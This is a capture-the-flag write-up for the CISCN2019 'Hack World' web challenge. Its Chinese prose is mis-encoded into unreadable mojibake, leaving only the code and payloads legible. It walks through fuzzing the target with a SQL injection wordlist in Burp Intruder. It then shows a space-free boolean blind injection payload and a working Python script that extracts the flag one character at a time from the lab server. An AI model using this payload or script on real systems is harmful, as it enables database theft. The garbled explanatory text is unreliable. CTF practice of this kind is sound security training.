# 1.fuzz���Թ����ַ�
- [CISCN2019 �������� Day2 Web1]Hack World
��Ŀ��ʾ��flag{} ��Ϊ uuid��
![alt text](image-42.png)
ʹ�� /attack/sql-injection/detect/xplatform.txt����payload
ץ�����͵�Intruder���Զ�������payloadλ��![alt text](image-36.png)
����payload�����ļ��м���/attack/sql-injection/detect/xplatform.txt����ʼ����
ѡ������鿴response�����ֳ���530�ķ���SQL Injection Checked������520�ķ���bool(false)��˵������530�Ķ�������
![alt text](image-37.png)![alt text](image-38.png)
����ע��㣬������äע
![alt text](image-39.png)![alt text](image-40.png)
ֱ�Ӳ�flag��flag�ֶε�����:
ʹ��������()����ո�
id=(select(ascii(mid(flag,1,1))=102)from(flag))
![alt text](image-41.png)
��д�ű����ƣ�
```python
# -*- coding:utf-8 -*-
# Author: mochu7
import requests
import string


def blind_injection(url):
    flag = ""
    strings = string.printable
    # num���ô�һ�㣬flag��uuid
    for num in range(1, 100):
        for i in strings:
            payload = "(select(ascii(mid(flag,{0},1))={1})from(flag))".format(
                num, ord(i)
            )
            post_data = {"id": payload}
            res = requests.post(url=url, data=post_data)
            if "Hello" in res.text:
                flag += i
                print(flag)
            else:
                continue
    print(flag)


if __name__ == "__main__":
    url = "http://5386a1e3-de18-477c-8aa0-b0eb80124870.node5.buuoj.cn:81/index.php"
    blind_injection(url)
```
��Ҫ�����Ӳ�������![alt text](image-44.png)

# 2.[SWPU2019]Web1